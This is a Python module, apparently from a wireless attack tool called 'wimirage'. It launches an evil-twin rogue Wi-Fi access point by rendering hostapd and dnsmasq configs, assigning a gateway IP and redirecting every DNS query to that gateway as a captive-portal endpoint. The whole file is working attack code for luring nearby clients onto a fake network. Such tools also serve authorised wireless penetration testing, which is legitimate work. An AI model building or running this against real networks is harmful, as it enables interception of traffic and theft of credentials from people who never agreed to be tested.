"""Stand up a rogue Wi-Fi access point using hostapd + dnsmasq.

The ``RogueAP`` class renders Jinja2-written hostapd/dnsmasq configs, brings
the given interface up with our chosen gateway IP, registers the resulting
child processes with the provided :class:`ProcessManager`, and tears it all
back down on :meth:`stop`.
"""

import os
import subprocess
import time
import logging
from typing import Optional
from jinja2 import Template

from core.process_manager import ProcessManager
from core.paths import (
    HOSTAPD_CONF_PATH,
    DNSMASQ_CONF_PATH,
    HOSTAPD_PID_PATH,
    DNSMASQ_PID_PATH,
    ensure_config_dir,
)

logger = logging.getLogger("wimirage")

__all__ = ["RogueAP"]


class RogueAP:
    """Drive an evil-twin AP by orchestrating hostapd and dnsmasq.

    Args:
        interface: Wireless interface that will broadcast.
        ssid: SSID to advertise to clients.
        channel: Wi-Fi channel to operate on.
        gateway: IPv4 address to assign to our interface (acts as captive
            portal endpoint).
        dhcp_range: Comma-separated DHCP lease range.
        process_manager: Optional pre-existing :class:`ProcessManager`. If
            ``None``, a fresh one is created.
    """

    DEFAULT_GATEWAY = "10.0.0.1"
    DEFAULT_DHCP_RANGE = "10.0.0.2,10.0.0.100"

    def __init__(self, interface: str, ssid: str, channel: int,
                 gateway: str = DEFAULT_GATEWAY, dhcp_range: str = DEFAULT_DHCP_RANGE,
                 process_manager: Optional[ProcessManager] = None) -> None:
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.gateway = gateway
        self.dhcp_range = dhcp_range
        self.hostapd_proc: Optional[subprocess.Popen] = None
        self.dnsmasq_proc: Optional[subprocess.Popen] = None
        self._pm = process_manager or ProcessManager()
        self._hostapd_conf = HOSTAPD_CONF_PATH
        self._dnsmasq_conf = DNSMASQ_CONF_PATH
        self._hostapd_pid = HOSTAPD_PID_PATH
        self._dnsmasq_pid = DNSMASQ_PID_PATH
        self._hostapd_stderr: Optional[str] = None
        self._dnsmasq_stderr: Optional[str] = None

    def _generate_hostapd_config(self) -> str:
        """Render ``config/hostapd.conf.j2`` to disk.

        Returns:
            Absolute path to the rendered config file.
        """
        # Security fix S-7 (quality): hostapd's parser splits on whitespace
        # but does NOT tolerate raw newlines inside an option. A user /
        # attacker who configures an SSID with an embedded newline would
        # otherwise break hostapd or smuggle a new option line. Strip CR/LF
        # up-front so the rendered config stays single-line safe.
        safe_ssid = (self.ssid or "").replace("\n", "").replace("\r", "")
        template_str = """interface={{ interface }}
driver=nl80211
ssid={{ ssid }}
hw_mode=g
channel={{ channel }}
wmm_enabled=0
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        template = Template(template_str)
        config = template.render(
            interface=self.interface,
            ssid=safe_ssid,
            channel=self.channel
        )
        ensure_config_dir()
        with open(self._hostapd_conf, "w") as f:
            f.write(config)
        return self._hostapd_conf

    def _generate_dnsmasq_config(self) -> str:
        """Render ``config/dnsmasq.conf.j2`` to disk.

        Returns:
            Absolute path to the rendered config file.
        """
        template_str = """interface={{ interface }}
dhcp-range={{ dhcp_range }},12h
dhcp-option=3,{{ gateway }}
dhcp-option=6,{{ gateway }}
address=/#/{{ gateway }}
log-queries
log-dhcp
"""
        template = Template(template_str)
        config = template.render(
            interface=self.interface,
            gateway=self.gateway,
            dhcp_range=self.dhcp_range
        )
        ensure_config_dir()
        with open(self._dnsmasq_conf, "w") as f:
            f.write(config)
        return self._dnsmasq_conf

    def _configure_interface(self) -> bool:
        """Bring ``self.interface`` down, flush, up, and assign gateway IP.

        Returns:
            True on success, False on timeout or any other error.
        """
        try:
            subprocess.run(["ip", "link", "set", self.interface, "down"], check=False,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=False,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            subprocess.run(["ip", "link", "set", self.interface, "up"], check=False,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            subprocess.run(["ip", "addr", "add", f"{self.gateway}/24", "dev", self.interface], check=False,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            logger.info(f"Interface {self.interface} configured with IP {self.gateway}")
            return True
        except subprocess.TimeoutExpired:
            logger.error(f"Timeout configuring interface {self.interface}")
            return False
        except (subprocess.SubprocessError, OSError) as e:
            logger.error(f"Failed to configure interface: {type(e).__name__}: {e}")
            return False

    def _read_stderr_log(self, prefix: str) -> str:
        """Read stderr capture from ``/tmp/{prefix}_{interface}.log``.

        Returns:
            Log contents as a string, or ``""`` if not readable after retries.
        """
        for attempt in range(3):
            try:
                log_file = f"/tmp/{prefix}_{self.interface}.log"
                if os.path.exists(log_file):
                    with open(log_file) as f:
                        return f.read()
            except (OSError, IOError):
                pass
            time.sleep(0.5)
        return ""

    def start(self) -> bool:
        """Bring the rogue AP online.

        Steps: render configs → configure interface (up/gateway) →
        launch hostapd (wait 2s, verify alive) → launch dnsmasq (wait 1s,
        verify alive) → register both processes.

        Returns:
            True if both daemons are running, False otherwise (with
            cleanup already attempted).
        """
        logger.info(f"Starting Rogue AP: {self.ssid} on channel {self.channel}")

        self._generate_hostapd_config()
        self._generate_dnsmasq_config()

        if not self._configure_interface():
            return False

        hostapd_log = f"/tmp/hostapd_{self.interface}.log"
        try:
            with open(hostapd_log, "w") as stderr_file:
                self.hostapd_proc = subprocess.Popen(
                    ["hostapd", "-P", self._hostapd_pid, self._hostapd_conf],
                    stdout=subprocess.DEVNULL,
                    stderr=stderr_file
                )
                self._pm.register("hostapd", self.hostapd_proc)
            time.sleep(2)
            if self.hostapd_proc.poll() is not None:
                error_log = self._read_stderr_log(f"hostapd_{self.interface}")
                msg = f"hostapd failed to start. Exit code: {self.hostapd_proc.returncode}"
                if error_log:
                    msg += f"\n  Error log: {error_log[:500]}"
                logger.error(msg)
                return False
            logger.info(f"hostapd started on {self.interface}")
        except FileNotFoundError:
            logger.error("hostapd not found. Install it: sudo apt install hostapd")
            return False
        except (subprocess.SubprocessError, OSError, PermissionError) as e:
            logger.error(f"hostapd error: {type(e).__name__}: {e}")
            return False

        dnsmasq_log = f"/tmp/dnsmasq_{self.interface}.log"
        try:
            with open(dnsmasq_log, "w") as stderr_file:
                self.dnsmasq_proc = subprocess.Popen(
                    ["dnsmasq", "-C", self._dnsmasq_conf, "-d"],
                    stdout=subprocess.DEVNULL,
                    stderr=stderr_file
                )
                self._pm.register("dnsmasq", self.dnsmasq_proc)
            time.sleep(1)
            if self.dnsmasq_proc.poll() is not None:
                error_log = self._read_stderr_log(f"dnsmasq_{self.interface}")
                msg = f"dnsmasq failed to start. Exit code: {self.dnsmasq_proc.returncode}"
                if error_log:
                    msg += f"\n  Error log: {error_log[:500]}"
                logger.error(msg)
                self.stop()
                return False
            logger.info(f"dnsmasq started - DHCP range: {self.dhcp_range}")
        except FileNotFoundError:
            logger.error("dnsmasq not found. Install it: sudo apt install dnsmasq")
            self.stop()
            return False
        except (subprocess.SubprocessError, OSError, PermissionError) as e:
            logger.error(f"dnsmasq error: {type(e).__name__}: {e}")
            self.stop()
            return False

        logger.info(f"Rogue AP '{self.ssid}' is running!")
        return True

    def stop(self) -> None:
        """Tear down hostapd, dnsmasq, and any tracked subprocesses."""
        if self.hostapd_proc and self.hostapd_proc.poll() is None:
            self.hostapd_proc.terminate()
            try:
                self.hostapd_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.hostapd_proc.kill()
            logger.info("hostapd stopped.")

        if self.dnsmasq_proc and self.dnsmasq_proc.poll() is None:
            self.dnsmasq_proc.terminate()
            try:
                self.dnsmasq_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.dnsmasq_proc.kill()
            logger.info("dnsmasq stopped.")

        self._pm.kill_all()

        logger.info("Rogue AP stopped.")

    def is_running(self) -> bool:
        """Return True iff both hostapd and dnsmasq are still alive."""
        return (self.hostapd_proc is not None and self.hostapd_proc.poll() is None and
                self.dnsmasq_proc is not None and self.dnsmasq_proc.poll() is None)
